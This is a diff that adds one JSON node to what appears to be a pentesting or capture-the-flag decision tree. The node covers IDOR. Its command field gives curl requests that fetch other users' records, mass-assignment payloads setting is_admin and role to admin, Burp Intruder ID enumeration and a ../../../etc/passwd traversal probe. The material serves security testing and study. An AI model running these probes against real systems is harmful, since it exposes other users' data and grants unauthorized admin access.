@@ -1,0 +1,22 @@
+{
+  "id": "idor",
+  "phase": "WEB",
+  "title": "IDOR — Insecure Direct Object Reference",
+  "body": "IDOR = change an ID in a request to access another user's data or escalate to admin. Look for numeric IDs in URLs, API responses, and cookies. Most useful when you have a low-priv account and need admin access.",
+  "cmd": "# Identify direct references\n# URL params:   /user?id=123   /api/document?doc_id=456\n# Path params:  /user/123/profile   /api/orders/789\n# POST bodies:  {\"user_id\": 123}\n# Cookies:      user_id=123  (decode base64 if encoded)\n# Headers:      X-User-ID: 123\n\n# Basic IDOR test — increment/decrement IDs\n# Your account: /api/user/123\n# Try:          /api/user/1  (admin?)\n#               /api/user/124  (next user)\n#               /api/user/0   /api/user/-1\n\n# Horizontal priv esc (access other users' data)\ncurl -H \"Cookie: session=YOURS\" http://$ip/api/user/124\ncurl -H \"Cookie: session=YOURS\" http://$ip/api/orders/1\n\n# Vertical priv esc (escalate to admin)\n# Look for role/admin fields in responses\n# Try changing: {\"user_id\":123,\"role\":\"admin\"}\n\n# Mass assignment — add privileged fields to POST\nPOST /api/profile\n{\"name\":\"attacker\",\"email\":\"x@x.com\",\"is_admin\":true,\"role\":\"admin\"}\n\n# UUID/GUID instead of sequential IDs?\n# Try:  /api/user/00000000-0000-0000-0000-000000000001  (admin UUID)\n# Or:   find user IDs from public endpoints (profile pages, comments)\n\n# Burp automation\n# Use Intruder on the ID parameter\n# Payload: sequential numbers 1-1000\n# Grep for: admin, sensitive data, other usernames\n\n# Check indirect references too:\n# /download?file=report.pdf  ->  /download?file=../../../etc/passwd\n# (this becomes path traversal/LFI — check lfi node)",
+  "warn": "IDOR is most powerful when combined with account registration. Create an account, note your user ID, then probe adjacent IDs and admin endpoints.",
+  "choices": [
+    {
+      "label": "Got admin access via IDOR",
+      "next": "web_fuzz_deep"
+    },
+    {
+      "label": "IDOR gave creds / sensitive data",
+      "next": "creds_found"
+    },
+    {
+      "label": "File reference IDOR — try path traversal",
+      "next": "lfi"
+    }
+  ]
+}
